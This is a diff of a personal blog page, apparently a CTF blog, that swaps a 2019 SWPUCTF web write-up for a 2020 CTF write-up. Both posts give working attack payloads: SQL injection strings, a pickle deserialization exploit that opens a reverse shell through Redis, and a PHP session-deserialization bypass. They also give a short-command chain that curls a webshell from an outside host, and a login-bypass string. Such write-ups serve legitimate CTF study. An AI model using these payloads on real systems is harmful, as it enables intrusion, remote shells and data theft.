@@ -55,22 +55,17 @@
   };
 </script>
 
-  <meta name="description" content="web1二次注入，在文章发表广告名存在注入，过滤了or，空格，不能用order by查字段，可以用group by查字段，也不能用information_schema这个库查询，所以通过其他方式查询表，无列名注入，附一个链接 聊一聊bypass information_schema，下面直接给出payload。">
-<meta name="keywords" content="CTF,web">
+  <meta name="description" content="web1.hackme打开页面，随便翻了一下，admin可以登录，有个框随便测了下，没什么发现，扫了一下目录有www.zip，找到了网站源码，看了一下，在profile.php，有session反序列化。所以sign传参|O:4:&amp;quot;info&amp;quot;:2:{s:5:&amp;quot;admin&amp;quot;;i:1;s:4:&amp;quot;sign&amp;quot;;s:1:&amp;quot;a&amp;quot;;">
+<meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2019SWPUCTF web题解">
-<meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;index.html">
+<meta property="og:title" content="高校战疫网络安全分享赛部分wp">
+<meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2020&#x2F;03&#x2F;07&#x2F;%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B&#x2F;index.html">
 <meta property="og:site_name" content="LiM&#39;s blog">
-<meta property="og:description" content="web1二次注入，在文章发表广告名存在注入，过滤了or，空格，不能用order by查字段，可以用group by查字段，也不能用information_schema这个库查询，所以通过其他方式查询表，无列名注入，附一个链接 聊一聊bypass information_schema，下面直接给出payload。">
+<meta property="og:description" content="web1.hackme打开页面，随便翻了一下，admin可以登录，有个框随便测了下，没什么发现，扫了一下目录有www.zip，找到了网站源码，看了一下，在profile.php，有session反序列化。所以sign传参|O:4:&amp;quot;info&amp;quot;:2:{s:5:&amp;quot;admin&amp;quot;;i:1;s:4:&amp;quot;sign&amp;quot;;s:1:&amp;quot;a&amp;quot;;">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504645263.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504750757.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504867049.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504959852.png">
-<meta property="og:updated_time" content="2019-12-17T08:55:07.702Z">
+<meta property="og:updated_time" content="2020-03-08T06:36:43.861Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504645263.png">
-  <link rel="canonical" href="https://li1m.github.io/2019/12/16/2019SWPUCTF-web%E9%A2%98%E8%A7%A3/">
+  <link rel="canonical" href="https://li1m.github.io/2020/03/07/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/">
 
 
 <script id="page-configurations">
@@ -84,7 +79,7 @@
   };
 </script>
 
-  <title>2019SWPUCTF web题解 | LiM's blog</title>
+  <title>高校战疫网络安全分享赛部分wp | LiM's blog</title>
   
 
 
@@ -267,7 +262,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
-    <link itemprop="mainEntityOfPage" href="https://Li1M.github.io/2019/12/16/2019SWPUCTF-web%E9%A2%98%E8%A7%A3/">
+    <link itemprop="mainEntityOfPage" href="https://Li1M.github.io/2020/03/07/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="LiM">
@@ -281,7 +276,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            2019SWPUCTF web题解
+            高校战疫网络安全分享赛部分wp
             
 
           
@@ -298,7 +293,7 @@
                 
               
 
-              <time title="Created: 2019-12-16 21:16:27" itemprop="dateCreated datePublished" datetime="2019-12-16T21:16:27+08:00">2019-12-16</time>
+              <time title="Created: 2020-03-07 19:20:33" itemprop="dateCreated datePublished" datetime="2020-03-07T19:20:33+08:00">2020-03-07</time>
             </span>
           
             
@@ -309,7 +304,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-12-17 16:55:07" itemprop="dateModified" datetime="2019-12-17T16:55:07+08:00">2019-12-17</time>
+                <time title="Modified: 2020-03-08 14:36:43" itemprop="dateModified" datetime="2020-03-08T14:36:43+08:00">2020-03-08</time>
               </span>
             
           
@@ -331,7 +326,7 @@
               
                 <span class="post-meta-item-text">Symbols count in article: </span>
               
-              <span>1.3k</span>
+              <span>2k</span>
             </span>
           
             <span class="post-meta-item" title="Reading time">
@@ -341,7 +336,7 @@
               
                 <span class="post-meta-item-text">Reading time &asymp;</span>
               
-              <span>1 mins.</span>
+              <span>2 mins.</span>
             </span>
           
 
@@ -354,14 +349,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>二次注入，在文章发表广告名存在注入，过滤了or，空格，不能用order by查字段，可以用group by查字段，也不能用information_schema这个库查询，所以通过其他方式查询表，无列名注入，附一个链接 <a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a>，下面直接给出payload。</p><a id="more"></a>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_auto_increment_columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22	//查表</span></span><br><span class="line"><span class="string">-1'</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>mysql.innodb_table_stats<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>database_name=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22	//查表</span></span><br><span class="line"><span class="string">-1'</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22	//无列名注入</span></span><br><span class="line"><span class="string">-1'</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(c)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)a),<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span><span class="string">'	//无列名注入</span></span><br></pre></td></tr></table></figure>
+        <p>web</p><p>1.hackme<br>打开页面，随便翻了一下，admin可以登录，有个框随便测了下，没什么发现，扫了一下目录有<code>www.zip</code>，找到了网站源码，看了一下，在profile.php，有session反序列化。所以sign传参<code>|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:1:&quot;a&quot;;}</code> 跳转./core/index.php</p><a id="more"></a>
 
-<p>下面给些图理解<br><img src="1576504645263.png" alt="1576504645263"></p>
-<p><img src="1576504750757.png" alt="1576504750757"><br><img src="1576504867049.png" alt="1576504867049"><br><img src="1576504959852.png" alt="1576504959852"></p>
-<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>登录源码提示redis，redis-cli -h host -p 6379可以链接redis库，弹个shell，找到flag。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">		s = <span class="string">"bash -i &gt;&amp; /dev/tcp/xx/xx 0&gt;&amp;1"</span></span><br><span class="line">		<span class="keyword">return</span> (os.system, (s,))</span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">r = redis.Redis(host=<span class="string">'114.67.109.247'</span>,password=<span class="string">"password"</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</span><br><span class="line">r.set(<span class="string">"session:your_session"</span>, s)</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $sign;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = $_SESSION[<span class="string">'admin'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sign = $_SESSION[<span class="string">'sign'</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sign;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span><br><span class="line">            redirect(<span class="string">'./core/index.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> info();</span><br><span class="line"><span class="meta">?&gt;</span>	<span class="comment">//profile.php</span></span><br></pre></td></tr></table></figure>
 
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#hint : core/clear.php</span></span><br><span class="line">    $sandbox = <span class="string">'./sandbox/'</span> . md5(<span class="string">"Mrk@1xI^"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">        $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, $url)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you are hacker"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $res = parse_url($url);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, $res[<span class="string">'host'</span>])) &#123;</span><br><span class="line">                    $code = file_get_contents($url);</span><br><span class="line">                    <span class="keyword">if</span> (strlen($code) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">                        @exec($code);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"invalid url"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'只有管理员才能看到我哟'</span>);</span><br><span class="line">&#125;	<span class="comment">//./core/index.php</span></span><br></pre></td></tr></table></figure>
+
+<p>这个和hitcon-ctf-2017/babyfirst-revenge-v2差不多，url的过滤可以用<code>url=compress.zlib://data:@127.0.0.1/,xxxx</code> 后面接要执行的命令要在四个字符内。具体命令构造参考 <a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py" target="_blank" rel="noopener">hitcon-ctf-2017官方wp</a> 我的payload如下，下载一句话到所在目录，最后在根目录找到flag。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt; </span><br><span class="line">&gt;ht-</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br><span class="line">&gt;p</span><br><span class="line">&gt;ph\</span><br><span class="line">&gt;b.\</span><br><span class="line">&gt;\&gt;\</span><br><span class="line">&gt;0\</span><br><span class="line">&gt;08\</span><br><span class="line">&gt;:8\</span><br><span class="line">&gt;94\</span><br><span class="line">&gt;2.\</span><br><span class="line">&gt;6\</span><br><span class="line">&gt;3.\</span><br><span class="line">&gt;10\</span><br><span class="line">&gt;7.\</span><br><span class="line">&gt;4\</span><br><span class="line">&gt;\+\</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line">sh+x</span><br><span class="line">sh+g</span><br></pre></td></tr></table></figure>
+
+<p>2.sqlcheckin<br>用户名admin，密码1’-‘1就可以，当查询为0时返回所有数据</p>
 
     </div>
 
@@ -379,8 +376,6 @@
             
               <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i># CTF</a>
             
-              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i># web</a>
-            
           </div>
         
 
@@ -389,8 +384,8 @@
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
               
-                <a href="/2019/12/10/2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3/" rel="next" title="2019 Stalker招新web和crypto题解">
-                  <i class="fa fa-chevron-left"></i> 2019 Stalker招新web和crypto题解
+                <a href="/2020/03/05/%E9%9D%A2%E8%AF%95/" rel="next" title="面试">
+                  <i class="fa fa-chevron-left"></i> 面试
                 </a>
               
             </div>
@@ -398,10 +393,6 @@
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/12/22/2019GXYCTFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" rel="prev" title="2019-GXYCTFweb部分题解">
-                  2019-GXYCTFweb部分题解 <i class="fa fa-chevron-right"></i>
-                </a>
               
             </div>
           </div>
@@ -447,8 +438,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web1"><span class="nav-number">1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web2"><span class="nav-number">2.</span> <span class="nav-text">web2</span></a></li></ol></div>
-        
       </div>
       <!--/noindex-->
 
